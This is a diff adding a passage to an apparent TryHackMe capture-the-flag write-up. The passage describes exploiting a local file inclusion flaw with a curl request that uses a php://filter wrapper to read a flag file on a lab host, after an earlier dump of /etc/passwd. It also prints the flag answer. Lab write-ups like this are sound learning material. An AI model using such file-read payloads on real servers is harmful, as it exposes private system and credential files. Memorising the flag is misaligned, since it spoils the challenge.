@@ -246,3 +246,15 @@ root:x:0:0:root:/root:/bin/bash
 ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
 ...
 ```
+From here its not hard to get the flag if you know the locations
+- In this case the passwd file was a waste of time.
+- I tried variations of home/ubuntu directory flag.txt user.txt but if web server var/www made more sense.
+- Conversion of format not required but interesting to try.
+```
+curl "http://10.67.152.51/index.php?doc=php://filter/resource=/var/www/flag.txt"
+THM{wr4pp3rs_sk1p_th3_wh1t3l1st}
+```
+
+## Task 4: Casino Heist
+
+- Download 20mb pcap file in zip file format.
